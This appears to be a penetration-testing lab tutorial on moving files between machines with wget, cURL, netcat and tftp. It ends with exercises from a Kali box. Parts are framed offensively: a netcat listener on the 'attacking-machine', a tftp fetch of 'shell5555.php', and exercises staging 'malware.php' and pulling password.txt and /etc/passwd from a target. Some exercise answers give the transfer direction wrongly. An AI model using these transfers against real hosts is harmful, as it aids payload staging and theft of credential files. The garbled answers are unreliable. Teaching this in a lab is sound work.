# Downloading files

## Goals : 
- Know how to transfer files between several machines

## Wget

The newest isn't always better, and wget the order is proof of that. First launched in 1996, this application is still one of the best download managers on the planet. Whether you want to download a single file, an entire folder, or even mirror an entire website, wget lets you do it with a few keystrokes.

Most (if not all) Linux distributions come with wget by default. So Linux users don't have to do anything!

### Download a single file

Let's start with something simple. Copy the URL of a file you want to download into your browser.

````bash
┌──(kali㉿kali)-[~/lab/]
└─$ wget www.google.com/robots.txt 
--2022-05-08 15:20:08--  http://www.google.com/robots.txt
Resolving www.google.com (www.google.com)... 172.217.168.196, 2a00:1450:400e:801::2004
Connecting to www.google.com (www.google.com)|172.217.168.196|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7221 (7.1K) [text/plain]
Saving to: ‘robots.txt’

robots.txt                   100%[==============================================>]   7.05K  --.-KB/s    in 0s      

2022-05-08 15:20:08 (425 MB/s) - ‘robots.txt’ saved [7221/7221]

````


Mirroring an entire website
If you want to download a whole website, wget can do the job.

````bash
wget -m http://example.com
````

### Download a complete directory
Here are the steps to download directory & subdirectories using wget.

Typically, if you want to download directory & all subdirectories using wget command, you need to use -r option for recursive file transfer.

````
wget -r ftp://example.com/folder
````


## cURL 

cURL is short for "URL Client". cURL commands are designed to work as a way to check connectivity to URLs and as a great tool for transferring data. Let's see how you can start using it.

The cURL command supports the following list of protocols:  

- HTTP and HTTPS
- FTP and FTPS
- IMAP and IMAPS
- POP3 and POP3S
- SMB and SMBS
- SFTP
- SCP
- TELNET
- GOPHER
- LDAP and LDAPS
- SMTP and SMTPS

These are the most important protocols, but there are others. cURL is powered by libcURL, which is a free client-side URL transfer library.


First, let's check which version of cURL is available with the following command:

````
cURL --version
````

cURL commands allow you to download files remotely. You can do this in two different ways:

- ``-O`` will save the file in the current working folder with the same file name.
- ``-o`` allows you to specify a different file name or location  

Here is an example of this type of action:

````
cURL -O http://example.com/example.tar.gz
````

The above command will save the file under the name example.tar.gz.

````
cURL -o newfile.tar.gz http://example.com/example.tar.gz
````
The above command will save the file under the name newfile.tar.gz

### cURL for Http
cURL can also be used when there is a proxy server. If you are behind a proxy server that uses port 8090 on exampledeproxy.com, download the files as shown below:
````sh
cURL -x exampleproxy.com:8090 -U username:password -O http://example.com/file.tar.gz
````

In the above example, you can avoid the -U username:password parameter if the proxy does not require an authentication method.

A typical HTTP request always contains a header. The HTTP header sends additional information about the remote web server along with the actual request. Although browser development tools allow you to check the header information, you can check it using a cURL command.

````sh
cURL -I www.exemple.com
````

### cURL for cookies
The cURL command can be used to check which cookies are downloaded from any URL. So, if you go to https://www.sitewebexemple.com, you can create a file, save the cookies and view them using cat or a VIM editor.

Below is an example of such a command:

````
cURL --cookie-jar myCookie.txt https://www.example.com/index.html -O
````

Also, if you have the cookies in a file, you can send it to the website. An example of this command is shown below:

````sh
cURL --cookie myCookie.txt https://www.example.com
````
### cURL for FTP
The cURL command supports FTP! You can use it to download files from a remote server.

````
cURL -u username:password -O ftp://exampleftp/example.tar.gz
````

In the above command, ftp://exampleftp is an FTP server that accepts connections. The username and password can be ignored for anonymous FTP connections. Type the command and watch the progress bar fill in.

You can also download files with the command below:
````sh
cURL -u username:password -T filetest.tar.gz ftp://exempleserveurftp
````

Again, we can ignore the username and password for anonymous FTP connections.


## Differences Between wget and cURL
Here are some of the differences between cURL and wget:

- Wget is a simple transfer utility, while cURL offers so much more.
- cURL provides the libcURL library, which can be expanded into GUI applications. Wget, on the other hand, is a simple command-line utility.
- Wget supports fewer protocols compared to cURL.
- Recursive downloads are not supported in cURL.
- Wget is natively available in Linux systems, while cURL is readily available in Windows systems.
- cURL supports multiple parallel transfers.
- cURL performs Transfer-Encoded HTTP decompressions, while wget does not.
- cURL supports bidirectional HTTP while wget offers a plain HTTP POST.
- cURL supports more HTTP auth methods compared to wget.
- Wget does not support SOCKS.
- Wget requires gnulib installed.
- Unlike cURL, features such as cookies, timestamps, and follow redirects are enabled by default in wget. cURL requires each to be specified explicitly.


## Netcat
Another easy way to transfer files is by using netcat.

Netcat is a command line tool for writing and reading data in the network. For data transfer, Netcat uses the TCP/IP and UDP network protocols. Originally, this tool comes from the Unix universe but today it is available on all platforms

Because of its versatility, Netcat is often referred to as the "Swiss Army knife of TCP/IP". For example, it can be used to diagnose errors and problems that jeopardize the functionality and security of a network. Netcat's range of features also includes port scanning, data streaming or simple data transfers. In addition, it can be used to set up chat and web servers as well as to initiate email requests. This simple software was developed in the mid-1990s and can operate in both server and client mode.

If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because that will kill your session.

So instead you can connect from the target machine like this.

On kali machine:
````
nc -lvp 4444 < file
````

On student machine:
````
nc 10.12.0.xx 4444 > file
````


## Tftp
On some rare machine we do not have access to nc and wget, or curl. But we might have access to tftp. Some versions of tftp are run interactively, like this:
````
$ tftp 192.168.0.101
tftp> get myfile.txt
````

If we can't run it interactively, for whatever reason, we can do this trick:

````
tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
````


## Exercises 
> Connect to the virtual machine 10.xx.1.xx with the following credentials:  
> * ip : 10.12.0.xx  
> * user : Name  
> * password : name  


1. On your Kali machine, create a file named malware.php.
    ````
    echo "This is a malware file" > malware.php
    ````
    Then, in the same directory, create a temporary server with python on port 5000.
    ````
    python3 -m http.server 5000
    ````
2. On your student machine, download the malware.txt file with the wget command.
    > Your command : wget http://192.168.149.29:5000/malware.php

3. On your Student machine, download the malware.txt file with the cURL command.
    > Your command : curl -O http://192.168.149.29:5000/malware.php

4. On the student machine, create a file named password.txt and transfer it to your kali machine with netcat
    > Your commands :  nc 192.168.149.29 5000 > password.txt

5. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
    > Your commands: tftp 192.168.149.29 + tftp> get passwd + tftp> quit


